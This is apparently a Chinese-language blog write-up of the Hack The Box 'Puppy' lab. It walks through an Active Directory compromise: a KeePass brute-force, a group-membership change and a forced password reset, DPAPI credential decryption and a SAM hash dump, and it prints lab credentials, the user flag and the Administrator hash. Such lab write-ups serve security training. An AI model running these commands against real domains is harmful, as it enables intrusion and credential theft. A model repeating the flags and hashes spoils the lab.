---
title: Puppy # 从 Astro 的 title 转换
date: 2025/05/20 09:00:00 # 从 Astro 的 published 转换，并添加一个默认时间 (例如，早上9点)，使用您指定的日期格式
# updated: YYYY/MM/DD HH:MM:SS # 可选，如果文章有更新日期，可以添加此字段
description: 第一次自己拿下user # 从 Astro 的 description 转换
cover: /images/Puppy.jpg # 从 Astro 的 image 转换，注意路径前添加 '/' 表示根目录
tags: # 从 Astro 的 tags 转换
  - 渗透测试
  - 域渗透
  - dpapi
  - keepass
categories: # 从 Astro 的 category 转换，Hexo 常用 categories (复数)
  - Writeup
# 以下是 Redefine 主题特有或常用的可选字段，根据您的需求选择性添加
# author: 您的名字 # 可选，如需显示文章作者
# avatar: /img/your-avatar.png # 可选，如需显示作者头像
password: 9c541c389e2904b9b112f599fd6b333d # 文章加密，根据需要添加
message: 请给出admin的hash
encrypt_abstract: 里面有什么呢？
# sticky: 1 # 置顶文章，数值越大优先级越高
# comment: true # 是否开启评论，默认开启
# toc: true # 是否显示目录，默认开启
# math: false # 是否开启数学公式，默认关闭
# mermaid: false # 是否开启 Mermaid 图表，默认关闭
---
凭证：`levi.james / KingofAkron2025!`

## 侦察阶段

### nmap 扫描结果

```bash
# Nmap 7.94SVN scan initiated Mon May 19 01:41:51 2025 as: nmap -sT -sC -sV -O -p53,88,111,135,139,389,445,464,593,636,2049,3260,3268,3269,5985,9389,49664,49667,49668,49670,49687,51343,51384 -A -oA ./nmapscan/detials 10.10.11.70
Nmap scan report for puppy.htb (10.10.11.70)
Host is up (0.16s latency).

Bug in iscsi-info: no string output.
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-05-19 12:21:10Z)
111/tcp   open  rpcbind       2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/tcp6  rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  2,3,4        111/udp6  rpcbind
|   100003  2,3         2049/udp   nfs
|   100003  2,3         2049/udp6  nfs
|   100005  1,2,3       2049/udp   mountd
|   100005  1,2,3       2049/udp6  mountd
|   100021  1,2,3,4     2049/tcp   nlockmgr
|   100021  1,2,3,4     2049/tcp6  nlockmgr
|   100021  1,2,3,4     2049/udp   nlockmgr
|   100021  1,2,3,4     2049/udp6  nlockmgr
|   100024  1           2049/tcp   status
|   100024  1           2049/tcp6  status
|   100024  1           2049/udp   status
|_  100024  1           2049/udp6  status
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: PUPPY.HTB0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
2049/tcp  open  nlockmgr      1-4 (RPC #100021)
3260/tcp  open  iscsi?
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: PUPPY.HTB0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49687/tcp open  msrpc         Microsoft Windows RPC
51343/tcp open  msrpc         Microsoft Windows RPC
51384/tcp open  msrpc         Microsoft Windows RPC
```

### LDAP查询

```bash
# 基本LDAP信息
dn:
domainFunctionality: 7
forestFunctionality: 7
domainControllerFunctionality: 7
rootDomainNamingContext: DC=PUPPY,DC=HTB
ldapServiceName: PUPPY.HTB:dc$@PUPPY.HTB
isGlobalCatalogReady: TRUE
```

### Bloodhound分析

通过Bloodhound分析发现levi.james用户属于HR组，HR组对developer组有写权限。

![Bloodhound分析图](https://raw.githubusercontent.com/Enchanter-W/Pics/master/image-20250519174227000.png)

## 初始访问

### 添加到developers组

通过bloodyAD工具将当前用户添加到developers组:

```bash
bloodyAD -d puppy.htb -u levi.james -p 'KingofAkron2025!' --dc-ip 10.10.11.70 add groupMember developers S-1-5-21-1487982659-1829050783-2281216199-1103
[+] S-1-5-21-1487982659-1829050783-2281216199-1103 added to developers
```

### SMB共享枚举

成功添加到developers组后，可以访问DEV共享:

```
SMB共享摘要:
共享名      权限       注释
ADMIN$     无权访问    Remote Admin
C$         无权访问    Default share
DEV        只读        DEV-SHARE for PUPPY-DEVS
IPC$       只读        Remote IPC
NETLOGON   只读        Logon server share
SYSVOL     只读        Logon server share

重要文件:
DEV共享:
|- KeePassXC-2.7.9-Win64.msi (34,394,112 字节)
|- Projects/ (目录)
|- recovery.kdbx (2,677 字节)
```

## 密码破解

### 破解KeePass数据库

使用keepass4brute工具破解recovery.kdbx:

```bash
./keepass4brute.sh ../recovery.kdbx /usr/share/wordlists/rockyou.txt
[+] Words tested: 36/14344392 - Attempts per minute: 120
[*] Password found: liverpool
```

### KeePass数据库内容

```
| 条目名称            | 用户名 | 密码            |
|-------------------|------|----------------|
| JAMIE WILLIAMSON   |      | JamieLove2025! |
| ADAM SILVER        |      | HJKL2025!      |
| ANTONY C. EDWARDS  |      | Antman2025!    |
| STEVE TUCKER       |      | Steve2025!     |
| SAMUEL BLAKE       |      | ILY2025!       |
```

## 权限提升路径

### 横向移动到ant.edwards

通过NetExec验证凭据:
```
SMB 10.10.11.70 445 DC [+] PUPPY.HTB\ant.edwards:Antman2025!
```

### 检查权限关系

通过Bloodhound发现ant.edwards对adam.silver有完全控制权限。

![用户权限关系](https://raw.githubusercontent.com/Enchanter-W/Pics/master/image-20250521153047624.png)

### 修改adam.silver用户密码

```bash
certipy -debug account update -u 'ant.edwards@puppy.htb' -p 'Antman2025!' -dc-ip 10.10.11.70 -user 'adam.silver' -pass NewPass123! -ldap-scheme ldap
[*] Successfully updated 'adam.silver'
```

### 获取用户标志

使用Evil-WinRM登录:

```powershell
*Evil-WinRM* PS C:\Users\adam.silver\desktop> type user.txt
aed82b50abc986f652c95c9f230963cf
```

## 进一步权限提升

### 发现备份文件与敏感信息

在C盘发现backups文件夹，找到steph.cooper用户的密码: `ChefSteph2025!`

### DPAPI凭据提取

获取并下载DPAPI相关文件:

```powershell
Get-ChildItem -Path 'C:\Users\steph.cooper\appdata\roaming\microsoft\Credentials' -Force -Recurse
Get-ChildItem -Path 'C:\Users\steph.cooper\appdata\roaming\microsoft\Protect' -Force -Recurse
```

使用impacket-dpapi解密主密钥:

```bash
impacket-dpapi masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 -sid S-1-5-21-1487982659-1829050783-2281216199-1107 -password 'ChefSteph2025!'
Decrypted key: 0xd9a570722fbaf7149f9f9d691b0e137b7413c1414c452f9c77d6d8a8ed9efe3ecae990e047debe4ab8cc879e8ba99b31cdb7abad28408d8d9cbfdcaf319e9c84
```

解密凭据:

```bash
impacket-dpapi credential -file C8D69EBE9A43E9DEBF6B5FBD48B521B9 -key 0xd9a570722fbaf7149f9f9d691b0e137b7413c1414c452f9c77d6d8a8ed9efe3ecae990e047debe4ab8cc879e8ba99b31cdb7abad28408d8d9cbfdcaf319e9c84
Username    : steph.cooper_adm
Unknown     : FivethChipOnItsWay2025!
```

### 获取系统权限

使用获取的高权限账户获取系统权限:

```powershell
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)                                                    
Administrator:500:aad3b435b51404eeaad3b435b51404ee:9c541c389e2904b9b112f599fd6b333d:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```